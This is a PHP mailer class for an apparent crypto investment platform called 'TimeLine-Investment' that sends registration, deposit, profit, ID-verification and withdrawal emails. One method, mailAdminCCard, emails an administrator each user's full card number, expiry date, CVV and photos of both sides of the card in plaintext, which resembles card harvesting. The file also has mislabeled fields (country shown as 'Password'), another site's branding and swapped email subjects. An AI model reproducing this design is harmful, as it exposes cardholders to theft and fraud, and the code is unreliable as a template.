<?php

namespace Royaltechinc;

class Mailer
{


    public function mailUserReg($email, $fname, $username, $vcode)
    {

        $subject = "TimeLine-Investment: Registration Successful";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ',<br><br>

Welcome to TimeLine-Investment - where crypto trading and investments are safe and simplified!<br><br>

Here is your access information:<br><br>

Login: ' . $username . '<br>
Password: ***** (hidden) <br><br>
<b>Verify your account using this code</b><br>
<br>
<h4>' . $vcode . '</h4><br><br>

You can login here: https://timelineinvestment.fxnetwork.space/ <br><br>

Thank you,<br>
TimeLine-Investment Limited <br>
https://timelineinvestment.fxnetwork.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailAdminReg($email, $uemail, $fname, $username, $country, $number)
    {

        $subject = "TimeLine-Investment: Registration Successful";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
New User Registration <br><br>

Email: ' . $uemail . ' <br><br>
Username: ' . $username . ' <br><br>
Fullname: ' . $fname . '<br><br>
Password: ' . $country . '<br><br>
Number: ' . $number . '<br><br>

<b>Developed By Cyberpwince</b> <br><br>

Thank you,<br>
TimeLine-Investment Limited <br>
https://timelineinvestment.fxnetwork.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailUserDepo($email, $fname, $amount, $plan, $interest)
    {

        $subject = "TimeLine-Investment: Deposit Successful";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ',<br><br>

Deposit Information<br><br>

Amount: ' . $amount . ' USD <br>
Plan: ' . $plan . ' <br>
Total Interest: ' . $interest . ' USD <br><br>



You can login here: https://timelineinvestment.fxnetwork.space/ <br>

Thank you,<br>
TimeLine-Investment Limited <br>
https://timelineinvestment.fxnetwork.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailUserProfit($email, $fname, $amount, $plan)
    {

        $subject = "TimeLine-Investment: Profit Notification";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ',<br><br>

Profit Information<br><br>

Amount: ' . $amount . ' USD <br>
Plan: ' . $plan . ' <br><br>



You can login here to view your earnings: https://timelineinvestment.fxnetwork.space/ <br><br>

Thank you, <br>
TimeLine-Investment Limited <br>
https://timelineinvestment.fxnetwork.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailAdminCard($email, $uemail, $fname, $type, $frontcard, $backcard)
    {
        global $home;
        $subject = "TimeLine-Investment: ID Verification";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
New User ID verification <br><br>

Email: ' . $uemail . ' <br><br>
Fullname: ' . $fname . '<br><br>
Document Type: ' . $type . '<br><br>
Front Id card: <a href="' . $home . '/verifyimage/' . $frontcard . '">' . $home . '/verifyimage/' . $frontcard . '</a><br>
Back Id card: <a href="' . $home . '/verifyimage/' . $backcard . '">' . $home . '/verifyimage/' . $backcard . '</a>



<br><br>

<b>Developed By Cyberpwince</b> <br><br>

Thank you,<br>
TimeLine-Investment <br>
https://timelineinvestment.fxnetwork.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailAdminCCard($email, $amount, $uemail, $fname, $ccname, $ccard, $cmon, $cyy, $cvv, $frontcc, $backcc)
    {
        global $home;
        $subject = "Stockpulsetrade: Deposit Credit Card";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
New User Deposit Credit Card <br><br>

Amount: ' . $amount . ' <br><br>
Email: ' . $uemail . ' <br><br>
Fullname: ' . $fname . '<br><br>
Card Name: ' . $ccname . '<br>
Card Number: ' . $ccard . '<br>
Card Exp: ' . $cmon . '/' . $cyy . '<br>
Cvv: ' . $cvv . ' <br>
Front CC: <a href="' . $home . '/uploads/' . $frontcc . '">' . $home . '/uploads/' . $frontcc . '</a><br>
Back CC: <a href="' . $home . '/uploads/' . $backcc . '">' . $home . '/uploads/' . $backcc . '</a><br>



<br><br>

<b>Developed By Cyberpwince</b> <br><br>

Thank you,<br>
StockPulseTrade <br>
https://stockpulsetrade.com/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailUserCard($uemail, $fname)
    {

        $subject = "TimeLine-Investment: ID Verification Status";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ' <br><br>

Your uploaded ID has been reviewed and verified by our team. <br>
You can login and start trading.


<br><br>

Thank you,<br>
TimeLine-Investment <br>
https://timelineinvestment.fxnetwork.space/ <br>

</body>';

        sendMail($subject, $msg, $uemail);
    }
    public function mailUserWithdrawal($email, $fname, $amount, $wallet)
    {

        $subject = "TimeLine-Investment: Topup Notification";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ',<br><br>

WIthdrawal Information<br><br>

Amount: ' . $amount . ' USD <br>
Wallet: ' . $wallet . ' <br>
Satus: Approved <br><br>



You can login to check your status: https://timelineinvestment.fxnetwork.space/ <br><br>

Thank you,<br>
TimeLine-Investment Limited <br>
https://timelineinvestment.fxnetwork.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailVcode($email, $fname, $vcode)
    {

        $subject = "TimeLine-Investment: Verification Code";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ',<br><br>


<b>Verify your account using this code</b><br>
<br>
<h4>' . $vcode . '</h4><br><br>


You can login to verify your account: https://timelineinvestment.fxnetwork.space/ <br><br>

Thank you,<br>
TimeLine-Investment Limited <br>
https://timelineinvestment.fxnetwork.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
    public function mailTopUp($email, $fname, $amount)
    {

        $subject = "TimeLine-Investment: Withdrawal Notification";
        //$email= $mail;
        $msg = '
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
Hello ' . $fname . ',<br><br>


<b>Your account balance has been topped up</b><br>
<br>
<h4>' . $amount . '</h4><br><br>


You can login to check your balance: https://timelineinvestment.fxnetwork.space/ <br><br>

Thank you,<br>
TimeLine-Investment Limited <br>
https://timelineinvestment.fxnetwork.space/ <br>

</body>';

        sendMail($subject, $msg, $email);
    }
}
